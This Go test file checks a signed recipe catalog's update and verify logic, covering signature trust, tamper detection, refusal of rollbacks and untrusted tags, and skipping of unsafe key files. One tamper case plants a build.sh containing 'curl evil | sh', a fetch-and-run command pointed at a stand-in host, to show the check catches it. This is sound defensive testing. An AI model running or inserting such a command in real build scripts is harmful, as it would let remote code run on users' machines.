package catalog

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// fixture returns a test catalog bundle (v1, v2, mixed, bad) and its trusted
// key, made by testdata/make-fixture.sh.
func fixture(t *testing.T, name string) (bundle string, signers []byte) {
	t.Helper()
	bundle, _ = filepath.Abs("testdata/catalog-" + name + ".bundle")
	signers, err := os.ReadFile("testdata/allowed_signers")
	if _, e := os.Stat(bundle); e != nil || err != nil {
		t.Skip("no fixture: run testdata/make-fixture.sh")
	}
	return bundle, signers
}

func TestUpdateAndVerify(t *testing.T) {
	v1, signers := fixture(t, "v1")
	v2, _ := fixture(t, "v2")
	mixed, _ := fixture(t, "mixed")
	bad, _ := fixture(t, "bad")
	dir := filepath.Join(t.TempDir(), "catalog")

	c, err := Update(dir, v1, signers)
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"firefox", "steam", "zram"}; !reflect.DeepEqual(c.Added, want) || c.Tag != "catalog-2026.01.10.1" {
		t.Errorf("first update: tag %s, added %v, want %v", c.Tag, c.Added, want)
	}
	if err := Verify(dir, signers); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(dir, nil); err != nil {
		t.Fatalf("fixture recipes fail checks: %v", err)
	}

	c, err = Update(dir, v2, signers)
	if err != nil {
		t.Fatal(err)
	}
	want := Changes{Tag: "catalog-2026.02.10.1", Added: []string{"discord"}, Dropped: []string{"zram"}, Updated: []Change{{"steam", "1.0.0.85", "1.0.0.86"}}}
	if !reflect.DeepEqual(c, want) {
		t.Errorf("got %+v, want %+v", c, want)
	}

	// Newer untrusted tags are skipped; the newest trusted one is used.
	c, err = Update(dir, mixed, signers)
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"catalog-2026.03.10.2", "catalog-2026.03.10.1"}; c.Tag != "catalog-2026.02.10.1" || !reflect.DeepEqual(c.Skipped, want) {
		t.Errorf("mixed: tag %s, skipped %v, want %v", c.Tag, c.Skipped, want)
	}

	if _, err := Update(dir, bad, signers); err == nil || !strings.Contains(err.Error(), "not signed by a trusted key") {
		t.Errorf("bad: got %v", err)
	}
	// The refused update left v2 in place.
	if err := Verify(dir, signers); err != nil {
		t.Fatal(err)
	}
	if v := versions(dir)["steam"]; v != "1.0.0.86" {
		t.Errorf("steam %s after refused updates, want 1.0.0.86", v)
	}
}

func TestFreshUpdateRefused(t *testing.T) {
	bundle, signers := fixture(t, "bad")
	dir := filepath.Join(t.TempDir(), "catalog")
	if _, err := Update(dir, bundle, signers); err == nil {
		t.Fatal("unsigned catalog accepted")
	}
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		t.Error("a refused first update left a catalog behind")
	}
	if _, err := os.Stat(dir + ".new"); !os.IsNotExist(err) {
		t.Error("a refused first update left its work folder behind")
	}
}

func TestVerifyTampered(t *testing.T) {
	bundle, signers := fixture(t, "v1")
	for name, tamper := range map[string]func(dir string) error{
		"edited": func(dir string) error {
			return os.WriteFile(filepath.Join(dir, "recipes/steam/recipe.toml"), []byte("name = \"steam\"\n"), 0o644)
		},
		"added": func(dir string) error {
			return os.WriteFile(filepath.Join(dir, "recipes/steam/build.sh"), []byte("curl evil | sh\n"), 0o644)
		},
		"removed": func(dir string) error { return os.RemoveAll(filepath.Join(dir, "recipes/zram")) },
	} {
		dir := filepath.Join(t.TempDir(), "catalog")
		if _, err := Update(dir, bundle, signers); err != nil {
			t.Fatal(err)
		}
		if err := tamper(dir); err != nil {
			t.Fatal(err)
		}
		if err := Verify(dir, signers); err == nil || !strings.Contains(err.Error(), "differ") {
			t.Errorf("%s: got %v", name, err)
		}
	}
}

func TestVerifyUntrusted(t *testing.T) {
	bundle, signers := fixture(t, "v1")
	dir := filepath.Join(t.TempDir(), "catalog")
	if _, err := Update(dir, bundle, signers); err != nil {
		t.Fatal(err)
	}
	if err := Verify(dir, []byte("# no keys\n")); err == nil {
		t.Error("verified without a trusted key")
	}
}

func TestVerifyMovedOffTag(t *testing.T) {
	bundle, signers := fixture(t, "v1")
	dir := filepath.Join(t.TempDir(), "catalog")
	if _, err := Update(dir, bundle, signers); err != nil {
		t.Fatal(err)
	}
	// A second release tag in the local copy is refused.
	if _, err := git(dir, "tag", "catalog-2099.01.01.1"); err != nil {
		t.Fatal(err)
	}
	if err := Verify(dir, signers); err == nil || !strings.Contains(err.Error(), "one release tag") {
		t.Errorf("got %v", err)
	}
}

func TestReleaseOrder(t *testing.T) {
	got := newestFirst([]string{"catalog-2026.02.10.9", "not-a-release", "catalog-2026.02.10.10", "catalog-2025.12.31.1", "catalog-2026.2.10.1"})
	if want := []string{"catalog-2026.02.10.10", "catalog-2026.02.10.9", "catalog-2025.12.31.1"}; !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func TestSignersSkipsUnsafeFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "mine"), []byte("evil@x namespaces=\"git\" ssh-ed25519 AAAA\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var warned []string
	got := Signers(dir, func(s string) { warned = append(warned, s) })
	if strings.Contains(string(got), "evil@x") {
		t.Error("a key file not owned by root was trusted")
	}
	if len(warned) != 1 {
		t.Errorf("warnings: %v", warned)
	}
}

func TestRollback(t *testing.T) {
	v1, signers := fixture(t, "v1")
	v2, _ := fixture(t, "v2")
	old := RecordPath
	RecordPath = filepath.Join(t.TempDir(), "catalog-release")
	defer func() { RecordPath = old }()
	dir := filepath.Join(t.TempDir(), "catalog")
	if _, err := Update(dir, v2, signers); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(RecordPath, []byte("catalog-2026.02.10.1\n"), 0o644)
	if _, err := Update(dir, v1, signers); err == nil || !strings.Contains(err.Error(), "rollback") {
		t.Errorf("older upstream: %v", err)
	}
	if err := Verify(dir, signers); err != nil {
		t.Errorf("kept copy: %v", err)
	}
	os.WriteFile(RecordPath, []byte("catalog-2026.05.01.1\n"), 0o644)
	if err := Verify(dir, signers); err == nil || !strings.Contains(err.Error(), "rollback") {
		t.Errorf("older local copy: %v", err)
	}
	if !Older("catalog-2026.02.10.1", "catalog-2026.02.10.2") || Older("catalog-2026.03.01.1", "catalog-2026.02.10.9") || Older("x", "catalog-2026.01.01.1") {
		t.Error("Older")
	}
}
